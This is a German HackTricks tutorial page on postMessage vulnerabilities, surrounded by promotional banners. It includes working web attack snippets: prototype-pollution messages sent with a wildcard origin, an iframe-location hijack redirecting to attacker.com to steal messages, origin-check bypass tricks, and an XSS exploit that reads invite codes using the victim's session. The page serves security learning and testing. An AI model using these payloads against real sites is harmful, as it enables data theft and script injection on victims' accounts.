# PostMessage-Schwachstellen

## PostMessage-Schwachstellen

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware**n **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe zu bek√§mpfen, die durch informationsstehlende Malware verursacht werden.

Sie k√∂nnen ihre Website besuchen und ihr Tool kostenlos ausprobieren unter:

{% embed url="https://whiteintel.io" %}

---

## Sende **PostMessage**

**PostMessage** verwendet die folgende Funktion zum Senden einer Nachricht:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Beachten Sie, dass **targetOrigin** ein '\*' oder eine URL wie _https://company.com_ sein kann.\
Im **zweiten Szenario** kann die **Nachricht nur an diese Domain gesendet werden** (auch wenn der Ursprung des Fensterobjekts unterschiedlich ist).\
Wenn das **Platzhalterzeichen** verwendet wird, k√∂nnen **Nachrichten an jede Domain gesendet werden** und werden an den Ursprung des Fensterobjekts gesendet.

### Angriff auf iframe & Platzhalterzeichen in **targetOrigin**

Wie in [**diesem Bericht**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) erkl√§rt, wenn Sie eine Seite finden, die **iframed** werden kann (kein `X-Frame-Header`-Schutz) und die sensible Nachrichten √ºber **postMessage** mit einem **Platzhalterzeichen** (\*) sendet, k√∂nnen Sie den **Ursprung** des **iframe** √§ndern und die **sensible** Nachricht an eine von Ihnen kontrollierte Domain **leaken**.\
Beachten Sie, dass wenn die Seite iframed werden kann, aber das **targetOrigin** auf eine URL und nicht auf ein Platzhalterzeichen gesetzt ist, wird dieser **Trick nicht funktionieren**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener Ausnutzung

**`addEventListener`** ist die Funktion, die von JS verwendet wird, um die Funktion zu deklarieren, die **`postMessages` erwartet**.\
Ein √§hnlicher Code wie der folgende wird verwendet:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
### Enumeration

Um **Event-Listener** auf der aktuellen Seite zu **finden**, k√∂nnen Sie:

- Die JS-Code nach `window.addEventListener` und `$(window).on` (_JQuery-Version_) durchsuchen
- Im Konsolenfenster der Entwicklertools ausf√ºhren: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

- Zu _Elements --> Event Listeners_ in den Entwicklertools des Browsers gehen

![](<../../.gitbook/assets/image (393).png>)

- Eine **Browsererweiterung** wie [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) oder [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) verwenden. Diese Browsererweiterungen werden alle Nachrichten **abfangen** und anzeigen.

### Origin-Pr√ºfung umgehen

- Das Attribut **`event.isTrusted`** gilt als sicher, da es nur f√ºr Ereignisse `True` zur√ºckgibt, die durch echte Benutzeraktionen generiert werden. Obwohl es herausfordernd ist, zu umgehen, ist seine Bedeutung bei Sicherheitspr√ºfungen beachtenswert.
- Die Verwendung von **`indexOf()`** zur Ursprungsvalidierung in PostMessage-Ereignissen kann umgangen werden. Ein Beispiel, das diese Schwachstelle veranschaulicht, ist:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
- Die Methode **`search()`** von `String.prototype.search()` ist f√ºr regul√§re Ausdr√ºcke vorgesehen, nicht f√ºr Zeichenfolgen. Das √úbergeben von etwas anderem als einem regul√§ren Ausdruck f√ºhrt zu einer impliziten Konvertierung in einen Regex, was die Methode potenziell unsicher macht. Dies liegt daran, dass in Regex ein Punkt (.) als Platzhalter fungiert und das Umgehen der Validierung mit speziell erstellten Domains erm√∂glicht. Zum Beispiel:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
- Die Funktion **`match()`**, √§hnlich wie `search()`, verarbeitet Regex. Wenn der Regex falsch strukturiert ist, k√∂nnte er anf√§llig f√ºr Umgehungen sein.
- Die Funktion **`escapeHtml`** ist dazu gedacht, Eingaben zu bereinigen, indem Zeichen maskiert werden. Sie erstellt jedoch kein neues maskiertes Objekt, sondern √ºberschreibt die Eigenschaften des vorhandenen Objekts. Dieses Verhalten kann ausgenutzt werden. Insbesondere wenn ein Objekt so manipuliert werden kann, dass seine gesteuerte Eigenschaft `hasOwnProperty` nicht erkennt, wird `escapeHtml` nicht wie erwartet funktionieren. Dies wird in den folgenden Beispielen demonstriert:

*   Erwartetes Versagen:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
*   Umgehen der Maskierung:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Im Kontext dieser Schwachstelle ist das `File`-Objekt aufgrund seiner schreibgesch√ºtzten `name`-Eigenschaft besonders anf√§llig f√ºr Ausnutzung. Diese Eigenschaft wird in Vorlagen verwendet und nicht von der `escapeHtml`-Funktion bereinigt, was zu potenziellen Sicherheitsrisiken f√ºhrt.
- Die Eigenschaft `document.domain` in JavaScript kann von einem Skript festgelegt werden, um die Domain zu verk√ºrzen und eine entspanntere Durchsetzung der Same-Origin-Richtlinie innerhalb der gleichen √ºbergeordneten Domain zu erm√∂glichen.

### e.origin == window.origin umgehen

Beim Einbetten einer Webseite in ein **sandboxed iframe** mit %%%%%% ist es wichtig zu verstehen, dass der Ursprung des iframes auf null gesetzt wird. Dies ist besonders wichtig im Umgang mit **Sandbox-Attributen** und deren Auswirkungen auf Sicherheit und Funktionalit√§t.

Durch die Angabe von **`allow-popups`** im Sandbox-Attribut erbt jedes Popup-Fenster, das aus dem iframe ge√∂ffnet wird, die Sandbox-Beschr√§nkungen seines √ºbergeordneten Elements. Dies bedeutet, dass, sofern das Attribut **`allow-popups-to-escape-sandbox`** nicht ebenfalls enthalten ist, der Ursprung des Popup-Fensters ebenfalls auf `null` gesetzt wird, was mit dem Ursprung des iframes √ºbereinstimmt.

Folglich, wenn unter diesen Bedingungen ein Popup ge√∂ffnet wird und eine Nachricht vom iframe an das Popup mit **`postMessage`** gesendet wird, haben sowohl der sendende als auch der empfangende Teil ihren Ursprung auf `null` gesetzt. Diese Situation f√ºhrt dazu, dass **`e.origin == window.origin`** als wahr ausgewertet wird (`null == null`), da sowohl das iframe als auch das Popup den gleichen Ursprungswert von `null` teilen.

F√ºr weitere Informationen **lesen Sie**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Umgehen von e.source

Es ist m√∂glich zu √ºberpr√ºfen, ob die Nachricht aus demselben Fenster stammt, in dem das Skript lauscht (besonders interessant f√ºr **Content Scripts von Browsererweiterungen**, um zu √ºberpr√ºfen, ob die Nachricht von derselben Seite gesendet wurde):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Du kannst **`e.source`** einer Nachricht erzwingen, indem du ein **iframe** erstellst, das die **postMessage** sendet und **sofort gel√∂scht** wird.

F√ºr weitere Informationen **lesen Sie:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header Umgehung

Um diese Angriffe durchzuf√ºhren, ist es idealerweise m√∂glich, die Opfer-Webseite in ein `iframe` einzubetten. Aber einige Header wie `X-Frame-Header` k√∂nnen dieses Verhalten **verhindern**.\
In solchen Szenarien kannst du dennoch einen weniger unauff√§lligen Angriff durchf√ºhren. Du kannst einen neuen Tab zur verwundbaren Webanwendung √∂ffnen und mit ihr kommunizieren:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Stehlen von Nachrichten, die an ein Kind gesendet wurden, indem die Hauptseite blockiert wird

Auf der folgenden Seite k√∂nnen Sie sehen, wie Sie sensible **postMessage-Daten**, die an ein **Child-Iframe** gesendet wurden, stehlen k√∂nnen, indem Sie die **Hauptseite blockieren**, bevor die Daten gesendet werden, und einen **XSS im Child** ausnutzen, um die Daten zu **leaken**, bevor sie empfangen werden:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Stehlen von Nachrichten durch √Ñndern des Iframe-Standorts

Wenn Sie eine Webseite ohne X-Frame-Header in ein Iframe einbetten k√∂nnen, das ein anderes Iframe enth√§lt, k√∂nnen Sie den **Standort dieses Child-Iframes √§ndern**, sodass, wenn es eine **postMessage** empf√§ngt, die mit einem **Wildcard** gesendet wurde, ein Angreifer den **Ursprung** dieses Iframes zu einer von ihm **kontrollierten Seite √§ndern** und die Nachricht **stehlen** k√∂nnte:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage zu Prototype Pollution und/oder XSS

In Szenarien, in denen die √ºber `postMessage` gesendeten Daten von JS ausgef√ºhrt werden, k√∂nnen Sie die **Seite in ein Iframe einbetten** und die **Prototype Pollution/XSS** ausnutzen, indem Sie den Exploit √ºber `postMessage` senden.

Ein paar **sehr gut erkl√§rte XSS √ºber `postMessage`** finden Sie unter [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Beispiel f√ºr einen Exploit zur Ausnutzung von **Prototype Pollution und dann XSS** √ºber eine `postMessage` an ein `Iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
F√ºr **weitere Informationen**:

* Link zur Seite √ºber [**Prototyp-Verschmutzung**](../deserialization/nodejs-proto-prototype-pollution/)
* Link zur Seite √ºber [**XSS**](../xss-cross-site-scripting/)
* Link zur Seite √ºber [**Client-seitige Prototyp-Verschmutzung zu XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referenzen

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Zum √úben: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware**n **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe aufgrund von informationsstehlender Malware zu bek√§mpfen.

Sie k√∂nnen ihre Website besuchen und ihre Engine **kostenlos** ausprobieren unter:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks im PDF-Format herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
